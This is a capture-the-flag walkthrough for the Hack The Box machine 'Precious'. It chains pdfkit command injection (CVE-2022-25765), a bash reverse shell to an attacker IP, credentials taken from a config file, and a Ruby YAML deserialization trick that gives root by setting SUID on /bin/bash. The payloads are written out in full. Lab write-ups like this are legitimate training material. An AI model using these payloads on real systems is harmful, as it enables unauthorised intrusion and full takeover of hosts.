<h2>Target: 10.129.78.215	     Precious</h2>

<b>Initial Access:</b><br>
nmap -Pn 10.129.78.215 --min-rate=5000 -p- |grep open|awk -F '/' '{print $1}'|tr '\n' ',' <br>
Output shows open ports 22 and 80

Enumerate these open ports further with nmap:<br>
nmap -Pn 10.129.78.215 --min-rate=5000 -p 22,80 -sC -sV -oN nmap.precious
 
![image](https://user-images.githubusercontent.com/93153300/204549554-428561a6-ec03-4f1b-800a-3de8c31612b3.png)
 
Visiting port 80 runs into an error because the site redirects to precious.htb.  To fix this, go to the file /etc/hosts and add in: 10.129.78.215 precious.htb  <br>
Visiting http://precious.htb shows:

![image](https://user-images.githubusercontent.com/93153300/204549621-42cbc990-7c65-47c9-be76-ef2e9cf8c798.png)

This page converts a web page to a pdf.  PDF converters are often vulnerable.  Capture the ‘Submit’ request in burp suite.  First, check if the pdf converter will run commands.  At the bottom of the burp suite capture we see a ‘url=’ parameter.  Enter ‘url=;ls’ and see if it runs the command:

![image](https://user-images.githubusercontent.com/93153300/204549659-0f5d031b-c7c3-4c0c-9d64-7691c2eb2160.png)

Burp suite shows a response of ‘You should provide a valid URL!’.  Add a url and test it again: url=http://localhost;ls

![image](https://user-images.githubusercontent.com/93153300/204549708-a0bb2d6d-acfc-4ad7-a59f-539cc4e678d9.png)

This time it works.  The response from burp suite shows ‘Generated by pdfkit v0.8.6’.  Google search ‘pdfkit v0.8.6 exploit’ found CVE 2022-25765.  This exploit says that this pdfkit version is vulnerable to command injection and explains the syntax to use.  Run a proof of concept with ping.  On our local kali run: tcpdump -i tun0 icmp <br>
On the website, precious.htb, submit the payload: http://%20/?user=\`ping -c 4 10.10.14.105\`

It worked, we got back 4 ping requests on our tcpdump.   We will use this to get a reverse shell.  On our local kali open a netcat listener (we will use pwncat because it gives a better shell): pwncat-cs -lp 443 

Change the ping command to a bash reverse shell: http://%20/?user=\`bash -c 'bash -i >& /dev/tcp/10.10.14.105/443 0>&1'\`

Submit the payload.  We have shell as user ruby:

![image](https://user-images.githubusercontent.com/93153300/204549729-a209929b-fe62-4122-822e-4b32c44900eb.png)
___________________________________________________________________________
<b>Lateral Movement</b><br>
Reading file /home/ruby/.bundle/config shows:

![image](https://user-images.githubusercontent.com/93153300/204549765-e5876878-78a6-4afb-976f-b20fd7d6d813.png)

The file shows credentials: username ‘henry’, password ‘Q3c1AqGHtoI0aXAYFH’. <br>
Run command ‘su henry’ → when prompted for the password then enter the password.  

We have shell as user henry.  Get the flag in file /home/henry/user.txt.
________________________________________________________________________________
<b>Privilege Esccalation:</b><br>
Log into user henry via ssh:  ssh henry@precious.htb → when prompted for the password then enter the password.  

Command ‘Sudo -l’ shows:

![image](https://user-images.githubusercontent.com/93153300/204549787-d58f2c0b-fb72-4c51-8821-5fbe8ea30680.png)
 
Reading the file /opt/update_dependencies.rb shows:

![image](https://user-images.githubusercontent.com/93153300/204562617-43f3a036-f00d-4301-946c-0729569b4319.png)

This file calls another file called ‘dependencies.yml’ without a complete path.  Since it is not using a complete path to call the ‘dependencies.yml’ file, we can create our own file called ‘dependencies.yml’ and put inside of it any content we want.   Google search ‘ruby yaml.load exploit’.  We find that yaml.load is vulnerable to a deserialization attack.  

An example exploit can be found at: https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated:

![image](https://user-images.githubusercontent.com/93153300/204563013-2d53b954-4d1e-43a0-b904-1a32349dc475.png)

On the second to last line, change ‘git_set: id’ to ‘git_set: chmod 4755 /bin/bash’.  This will make the file /bin/bash a suid.  Run command: sudo /usr/bin/ruby /opt/update_dependencies.rb <br>
Finally, run the command: /bin/bash -p

We have shell as root. We can get the flag in /root/root.txt.
 
